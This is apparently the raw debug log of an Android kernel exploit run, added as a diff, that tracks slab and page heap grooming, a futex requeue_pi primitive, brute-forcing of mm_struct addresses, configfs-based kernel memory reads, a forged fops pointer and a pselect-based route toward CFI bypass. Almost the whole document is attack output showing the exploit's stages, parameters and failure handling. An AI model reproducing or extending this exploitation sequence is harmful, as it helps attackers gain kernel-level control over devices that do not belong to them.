00[b24e39de8 23:26:52] [33m[*][t13553] [0m
+[b24e39de8 23:26:52] [33m[*][t13553] [0mslabinfo after sends: slabs=31 objs=884 free=170
+[b24e39de8 23:26:52] [33m[*][t13553] [0mreclaim queue right after sends rxq=3670016 txq=0
+[b24e39de8 23:26:52] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:26:52] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:26:52] [33m[*][t13553] [0mpayload nonce want=1894c0a330869462 got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:26:52] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93cc339070 len=8 fill=0 pos=7883678008957363548 page=92978c329cbd2b14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:26:52] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93cc339070 len=8 fill=0 pos=7883678008957363548 page=92978c329cbd2b14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:26:52] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93cc339070 len=8 fill=0 pos=7883678008957363548 page=92978c329cbd2b14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:26:52] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93cc339100 len=8 fill=0 pos=7883678008957363548 page=92978c329cbd2ba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:26:52] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93cc339100 len=8 fill=0 pos=7883678008957363548 page=92978c329cbd2ba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:26:52] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff93cc339100 len=8 fill=0 pos=7883678008957363548 page=92978c329cbd2ba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:26:52] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:26:52] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:26:52] [33m[*][t13553] [0mpayload gate pass=0 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=0 (sends=896 shorts=0 floor=512 hit=0 nhit2=0) hit_idx=-1 k_hit=-1 k_true=1 ord3=0/0 all=0/0 drain_pages=8192
+[b24e39de8 23:26:52] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:26:52] [31m[-][t13553] [0mpayload did not land, discard base=0xffffff93cc338000 freed=0 open_ok=0 nonce_hit=0 wp=-1/-1/-1
+[b24e39de8 23:26:52] [31m[-][t13553] [0mprepare_kernel_page retry 12/72
+[b24e39de8 23:26:52] [33m[*][t13553] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b24e39de8 23:26:54] [33m[*][t13553] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b24e39de8 23:26:54] [33m[*][t13553] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff91c0000000-ffffff9540000000] mte disabled
+[b24e39de8 23:26:54] [33m[*][t26634] [0mapprox_time=7 thr=70
+[b24e39de8 23:26:55] [33m[*][t26634] [0mstart finding collisisons
+[b24e39de8 23:26:55] [33m[*][t26634] [0mtarget    0000007a0c7900c8
+[b24e39de8 23:26:55] [33m[*][t26634] [0mtarget_time=133 thr=70
+[b24e39de8 23:26:56] [33m[*][t26634] [0m  00000069877ffb98 i=883 t=17501/17673/17640
+[b24e39de8 23:26:58] [33m[*][t26634] [0m  000000698854d608 i=4289 t=17717/17649/17636
+[b24e39de8 23:27:00] [33m[*][t26634] [0m  000000698921cc80 i=7568 t=17661/17490/14229
+[b24e39de8 23:27:01] [33m[*][t26634] [0m  0000006989a8d008 i=9729 t=17622/17638/17636
+[b24e39de8 23:27:02] [33m[*][t26634] [0m  0000006989e0abf0 i=10622 t=17698/14573/14176
+[b24e39de8 23:27:02] [33m[*][t26634] [0mfound 5 collisisons
+[b24e39de8 23:27:02] [33m[*][t26634] [0mpost-pile baseline=21 target=26 count=5
+[b24e39de8 23:27:02] [33m[*][t26634] [0mpost-pile[1] 00000069877ffb98 t=26
+[b24e39de8 23:27:02] [33m[*][t26634] [0mpost-pile[2] 000000698854d608 t=26
+[b24e39de8 23:27:02] [33m[*][t26634] [0mpost-pile[3] 000000698921cc80 t=26
+[b24e39de8 23:27:02] [33m[*][t26634] [0mpost-pile[4] 0000006989a8d008 t=26
+[b24e39de8 23:27:02] [33m[*][t26634] [0mpost-pile[5] 0000006989e0abf0 t=26
+[b24e39de8 23:27:02] [33m[*][t13553] [0mstart bruteforcing
+[b24e39de8 23:27:02] [33m[*][t30795] [0m[  3] start finding mm_struct [ffffff9300000000-ffffff9380000000]
+[b24e39de8 23:27:02] [33m[*][t30792] [0m[  0] start finding mm_struct [ffffff91c0000000-ffffff9240000000]
+[b24e39de8 23:27:02] [33m[*][t30793] [0m[  1] start finding mm_struct [ffffff9200000000-ffffff92c0000000]
+[b24e39de8 23:27:02] [33m[*][t30794] [0m[  2] start finding mm_struct [ffffff9280000000-ffffff9340000000]
+[b24e39de8 23:27:02] [33m[*][t30796] [0m[  4] start finding mm_struct [ffffff9380000000-ffffff9400000000]
+[b24e39de8 23:27:02] [33m[*][t30798] [0m[  6] start finding mm_struct [ffffff9440000000-ffffff9500000000]
+[b24e39de8 23:27:02] [33m[*][t30799] [0m[  7] start finding mm_struct [ffffff94c0000000-ffffff9540000000]
+[b24e39de8 23:27:02] [33m[*][t30797] [0m[  5] start finding mm_struct [ffffff93c0000000-ffffff9480000000]
+[b24e39de8 23:27:03] [33m[*][t30797] [0mfound mm_struct ffffff941be83c00
+[b24e39de8 23:27:03] [33m[*][t30797] [0m[  5] scan done coarse=ffffff9440000000 end=ffffff9480000000 found=1
+[b24e39de8 23:27:03] [33m[*][t30798] [0m[  6] scan done coarse=ffffff94c0000000 end=ffffff9500000000 found=1
+[b24e39de8 23:27:03] [33m[*][t30792] [0m[  0] scan done coarse=ffffff9240000000 end=ffffff9240000000 found=1
+[b24e39de8 23:27:03] [33m[*][t30793] [0m[  1] scan done coarse=ffffff9280000000 end=ffffff92c0000000 found=1
+[b24e39de8 23:27:03] [33m[*][t30795] [0m[  3] scan done coarse=ffffff9380000000 end=ffffff9380000000 found=1
+[b24e39de8 23:27:03] [33m[*][t30794] [0m[  2] scan done coarse=ffffff9300000000 end=ffffff9340000000 found=1
+[b24e39de8 23:27:03] [33m[*][t30799] [0m[  7] scan done coarse=ffffff9540000000 end=ffffff9540000000 found=1
+[b24e39de8 23:27:03] [33m[*][t30796] [0m[  4] scan done coarse=ffffff9400000000 end=ffffff9400000000 found=1
+[b24e39de8 23:27:03] [33m[*][t13553] [0mprepare_kernel_page base=0xffffff941be80000 phys_probe=0xffffff91e2bd1d38 delta=9549046472 (8.9GB)
+[b24e39de8 23:27:03] [33m[*][t13553] [0mprepare_skb_payload base=ffffff941be80000 delta=0 payload_base=ffffff941be80000
+[b24e39de8 23:27:03] [33m[*][t13553] [0mskbdelta wrote pb=ffffff941be80000 path=/data/local/tmp/ksu_boot/skbdelta
+[b24e39de8 23:27:03] [33m[*][t13553] [0mpayload nonce 9184b893086941d at 280 1100 9100 9280 d280 f280
+[b24e39de8 23:27:03] [33m[*][t13553] [0mdone
+[b24e39de8 23:27:03] [31m[-][t13553] [0mslub shrink(post-prepare) failed errno=13
+[b24e39de8 23:27:03] [33m[*][t13553] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b24e39de8 23:27:03] [33m[*][t13553] [0mslabinfo pre-teardown: slabs=54 objs=1836 free=0
+[b24e39de8 23:27:03] [33m[*][t13553] [0mslabinfo before victim-close: slabs=54 objs=1836 free=0
+[b24e39de8 23:27:03] [33m[*][t13553] [0mfix40 free-arm n=7 est_pfn=2997888 k=[-2,4]
+[b24e39de8 23:27:03] [33m[*][t13553] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b24e39de8 23:27:03] [33m[*][t13553] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b24e39de8 23:27:03] [33m[*][t13553] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b24e39de8 23:27:04] [33m[*][t13553] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b24e39de8 23:27:04] [33m[*][t13553] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b24e39de8 23:27:04] [33m[*][t13553] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b24e39de8 23:27:04] [33m[*][t13553] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b24e39de8 23:27:04] [33m[*][t13553] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b24e39de8 23:27:04] [33m[*][t13553] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b24e39de8 23:27:05] [33m[*][t13553] [0mslabinfo post-victim-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:27:05] [31m[-][t13553] [0mslub shrink(post-pins) failed errno=13
+[b24e39de8 23:27:05] [33m[*][t13553] [0mrcu socket cycles=1024
+[b24e39de8 23:27:05] [33m[*][t13553] [0mslabinfo post-socket-rcu: slabs=54 objs=1836 free=0
+[b24e39de8 23:27:05] [33m[*][t13553] [0mfix36 tp arm n=7 ctrl=1 est_pfn=2997888 k=[-2,4] k_fixed=-1
+[b24e39de8 23:27:05] [33m[*][t13553] [0mreclaim sends ok=501/1024 last_err=11
+[b24e39de8 23:27:05] [33m[*][t13553] [0mfix36 phase1 tp ctrl=528 ord3=501 best=0 best_pfn=0 best3=0 best3_pfn=0 n=7
+[b24e39de8 23:27:05] [33m[*][t13553] [0mphase2 forensics: post killed n=34
+[b24e39de8 23:27:05] [33m[*][t13553] [0mphase2 forensics: spray killed n=204
+[b24e39de8 23:27:05] [33m[*][t13553] [0mphase2 forensics: prepare storm i=0/1088
+[b24e39de8 23:27:05] [33m[*][t13553] [0mphase2 forensics: prepare storm i=256/1088
+[b24e39de8 23:27:06] [33m[*][t13553] [0mphase2 forensics: prepare storm i=512/1088
+[b24e39de8 23:27:06] [33m[*][t13553] [0mphase2 forensics: prepare storm i=768/1088
+[b24e39de8 23:27:06] [33m[*][t13553] [0mphase2 forensics: prepare storm i=1024/1088
+[b24e39de8 23:27:06] [33m[*][t13553] [0mphase2 forensics: prepare storm done n=1088
+[b24e39de8 23:27:06] [33m[*][t13553] [0mphase2 forensics: pre dropped n=33
+[b24e39de8 23:27:06] [33m[*][t13553] [0mphase2 forensics: membarrier rv=0 errno=11
+[b24e39de8 23:27:06] [33m[*][t13553] [0mslabinfo after rcu-kill: slabs=32 objs=913 free=175
+[b24e39de8 23:27:06] [33m[*][t13553] [0mfix40 free HIT pfn=3260032 k=1 hits=1
+[b24e39de8 23:27:06] [33m[*][t13553] [0mfix40 free verdict nhit=1 k_true=1
+[b24e39de8 23:27:06] [33m[*][t13553] [0mbuddy pre fopen errno=13
+[b24e39de8 23:27:06] [31m[-][t13553] [0mwatchpoint nonce open addr=ffffff941be81100 errno=22
+[b24e39de8 23:27:06] [31m[-][t13553] [0mwatchpoint open open addr=ffffff941be81070 errno=22
+[b24e39de8 23:27:06] [31m[-][t13553] [0mwatchpoint sentinel open addr=ffffff941be87f00 errno=22
+[b24e39de8 23:27:06] [33m[*][t13553] [0mphase2 tcp connections=8
+[b24e39de8 23:27:06] [33m[*][t30817] [0mfix36 tp arm n=7 ctrl=1 est_pfn=2997888 k=[-2,4] k_fixed=-1
+[b24e39de8 23:27:06] [33m[*][t30817] [0mphase2 conn[0] sends ok=2
+[b24e39de8 23:27:06] [33m[*][t30817] [0mphase2 conn[1] sends ok=1
+[b24e39de8 23:27:06] [33m[*][t30817] [0mphase2 conn[2] sends ok=1
+[b24e39de8 23:27:06] [33m[*][t30817] [0mphase2 conn[3] sends ok=1
+[b24e39de8 23:27:06] [33m[*][t30817] [0mphase2 conn[4] sends ok=1
+[b24e39de8 23:27:06] [33m[*][t30817] [0mphase2 conn[5] sends ok=1
+[b24e39de8 23:27:06] [33m[*][t30817] [0mphase2 conn[6] sends ok=1
+[b24e39de8 23:27:06] [33m[*][t30817] [0mphase2 stop after hit conn=0 send=0 (fix46)
+[b24e39de8 23:27:06] [33m[*][t13553] [0mfix38 capture conn=0 send=0 gsend=8 pfn=3260032 ord3_at=2 all_at_hit=1
+[b24e39de8 23:27:06] [33m[*][t13553] [0mfix51 capture-only (no rebase) nhit=1 k=1 pfn=3260032 est_pfn=2997888 base=ffffff941be80000 payload_base=ffffff941be80000
+[b24e39de8 23:27:06] [33m[*][t13553] [0mfix39 phase hit_cum=0 A=0 sK=8000 sK1=8000 have1=1 delta=0 deterministic=1
+[b24e39de8 23:27:06] [33m[*][t13553] [0mfix39 deterministic delta=0 OK
+[b24e39de8 23:27:06] [33m[*][t13553] [0mphase2 total sends ok=8 last_err=0 shorts=0
+[b24e39de8 23:27:06] [33m[*][t13553] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b24e39de8 23:27:06] [33m[*][t13553] [0mfix36 phase2 tp ctrl=10 ord3=9 best=1 best_pfn=3260032 best3=1 best3_pfn=3260032 n=7
+[b24e39de8 23:27:06] [33m[*][t13553] [0mfix36 phase2 tp HIT pfn=3260032 hits=1 ord3=1 k=1
+[b24e39de8 23:27:06] [33m[*][t13553] [0mphase2 peek conn=0 n=4352 w0=0 w1=ffffff941be82238 w2=ffffffd36b1e99cc w3=ffffffd36b1e9f04
+[b24e39de8 23:27:06] [33m[*][t13553] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffd36ade2f3800 at70=ffffffd36ade2f38 want_open=ffffffd36ade2f38
+[b24e39de8 23:27:06] [33m[*][t13553] [0mphase2 peek hex@1068[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 38[b24e39de8 23:27:06] [33m[*][t13553] [0m 2f[b24e39de8 23:27:06] [33m[*][t13553] [0m de[b24e39de8 23:27:06] [33m[*][t13553] [0m 6a[b24e39de8 23:27:06] [33m[*][t13553] [0m d3[b24e39de8 23:27:06] [33m[*][t13553] [0m ff[b24e39de8 23:27:06] [33m[*][t13553] [0m ff[b24e39de8 23:27:06] [33m[*][t13553] [0m ff[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m 00[b24e39de8 23:27:06] [33m[*][t13553] [0m
+[b24e39de8 23:27:06] [33m[*][t13553] [0mslabinfo after sends: slabs=32 objs=913 free=175
+[b24e39de8 23:27:06] [33m[*][t13553] [0mreclaim queue right after sends rxq=32768 txq=32769
+[b24e39de8 23:27:06] [33m[*][t13553] [0mfree watch order3_frees=-1 base_freed=0
+[b24e39de8 23:27:06] [33m[*][t13553] [0mpayload verify open=0 want=ffffffd36ade2f38 rv=-1
+[b24e39de8 23:27:06] [33m[*][t13553] [0mpayload nonce want=9184b893086941d got=0 rv=-1 capture=0 base_freed=0 allow_stale=0
+[b24e39de8 23:27:06] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff941be81070 len=8 fill=0 pos=7883678008957363548 page=92978c32ec71ab14 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:27:06] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff941be81070 len=8 fill=0 pos=7883678008957363548 page=92978c32ec71ab14 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:27:06] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff941be81070 len=8 fill=0 pos=7883678008957363548 page=92978c32ec71ab14 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:27:06] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff941be81100 len=8 fill=0 pos=7883678008957363548 page=92978c32ec71aba4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:27:06] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff941be81100 len=8 fill=0 pos=7883678008957363548 page=92978c32ec71aba4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:27:06] [33m[*][t13553] [0mcfgfs read fd=3 target=ffffff941be81100 len=8 fill=0 pos=7883678008957363548 page=92978c32ec71aba4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:27:06] [31m[-][t13553] [0mconfigfs verify failed r1=0 r2=0
+[b24e39de8 23:27:06] [33m[*][t13553] [0mpayload verify unavailable (kprobe denied); falling back to watchpoint oracle
+[b24e39de8 23:27:06] [33m[*][t13553] [0mpayload gate pass=1 content=0 (fv=-1) wp_armed=0 wp_capture=0 (n=-1 o=-1 s=-1) drain=1 (sends=8 shorts=0 floor=512 hit=1 nhit2=1) hit_idx=3 k_hit=1 k_true=1 ord3=0/1 all=0/1 drain_pages=8192
+[b24e39de8 23:27:06] [33m[*][t13553] [0morder3 drain release conns=8 pages=8192 buddy=-1
+[b24e39de8 23:27:06] [31m[-][t13553] [0mashmem guard chmod failed errno=13
+[b24e39de8 23:27:06] [33m[*][t30820] [0mowner thread start tid=30820
+[b24e39de8 23:27:06] [33m[*][t30821] [0mconsumer thread start tid=30821
+[b24e39de8 23:27:06] [33m[*][t30819] [0mwaiter thread start tid=30819
+[b24e39de8 23:27:06] [33m[*][t30818] [0mfops guard thread start tid=30818
+[b24e39de8 23:27:06] [33m[*][t13553] [0mmain cmp_requeue ret=-1 errno=35
+[b24e39de8 23:27:14] [33m[*][t30819] [0mwaiter requeue_pi ret=-1 errno=110
+[b24e39de8 23:27:14] [31m[-][t30819] [0mpselect Tier-0: capping route attempts 12 -> 1 (dangling-PI safety; relaunch per retry)
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffffd36d7d1d38 len=8 fill=0 pos=7883678008957363548 page=92978c723e06b7dc hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffffd36d7d1d38 len=8 fill=0 pos=7883678008957363548 page=92978c723e06b7dc hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffffd36d7d1d38 len=8 fill=0 pos=7883678008957363548 page=92978c723e06b7dc hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffffd36d7d1d30 len=8 fill=0 pos=7883678008957363548 page=92978c723e06b7d4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffffd36d7d1d30 len=8 fill=0 pos=7883678008957363548 page=92978c723e06b7d4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffffd36d7d1d30 len=8 fill=0 pos=7883678008957363548 page=92978c723e06b7d4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffffd36ac80000 len=8 fill=0 pos=7883678008957363548 page=92978c723b519aa4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffffd36ac80000 len=8 fill=0 pos=7883678008957363548 page=92978c723b519aa4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffffd36ac80000 len=8 fill=0 pos=7883678008957363548 page=92978c723b519aa4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffff941be82230 len=8 fill=0 pos=7883678008957363548 page=92978c32ec71bcd4 hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffff941be82230 len=8 fill=0 pos=7883678008957363548 page=92978c32ec71bcd4 hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffff941be82230 len=8 fill=0 pos=7883678008957363548 page=92978c32ec71bcd4 hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffff941be81358 len=8 fill=0 pos=7883678008957363548 page=92978c32ec71adfc hi=65 set=0 rd=0 errno=0 try=0
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffff941be81358 len=8 fill=0 pos=7883678008957363548 page=92978c32ec71adfc hi=65 set=0 rd=0 errno=0 try=1
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfgfs read fd=3 target=ffffff941be81358 len=8 fill=0 pos=7883678008957363548 page=92978c32ec71adfc hi=65 set=0 rd=0 errno=0 try=2
+[b24e39de8 23:27:14] [33m[*][t30819] [0mcfi baseline rb=0/0/0/0/0 misc=0000000000000000 m8=0000000000000000 text=0000000000000000 w0l=0000000000000000 lockw=0000000000000000
+[b24e39de8 23:27:14] [31m[-][t30819] [0mpselect Tier-0: forcing KS_PSELECT_NO_REPREPARE=1 (in-route re-prepare walks dangling PI state -> panic)
+[b24e39de8 23:27:14] [33m[*][t30819] [0mpselect fops value=ffffff941be81001 (fake=ffffff941be81000 + 1)
+[b24e39de8 23:27:14] [33m[*][t30819] [0mpselect safe lock=ffffffd36da95d00 slot=0/32 task=ffffffd36da97400
+[b24e39de8 23:27:14] [33m[*][t30819] [0mpselect fdset simple layout shift=0 wps=5 target=ffffffd36d7d1d38 value=ffffff941be81001 parent=ffffffd36d7d1d30
+[b24e39de8 23:27:14] [33m[*][t30819] [0mpselect fdset expect ready in=166 out=87 ex=1 total=254
+[b24e39de8 23:27:14] [33m[*][t30819] [0mroute armed attempt=1
+[b24e39de8 23:27:14] [33m[*][t30819] [0mroute pselect enter attempt=1
+[b24e39de8 23:27:14] [33m[*][t30819] [0mpselect returned attempt=1 ret=253 want=254 errno=0 calls=1 success=1 delay=50000 poke=1 boost_wait_ms=1
+[b24e39de8 23:27:14] [33m[*][t30819] [0mroute probe: slot marked dirty attempt=1 slot=0
+[b24e39de8 23:27:14] [33m[*][t30819] [0mroute probe: shared_zero checked dirty=0 attempt=1
+[b24e39de8 23:27:14] [33m[*][t30819] [0mroute probe: entering cfi stage attempt=1 calls=1 success=1
+[b24e39de8 23:27:14] [33m[*][t30819] [0mroute probe: opening ashmem attempt=1
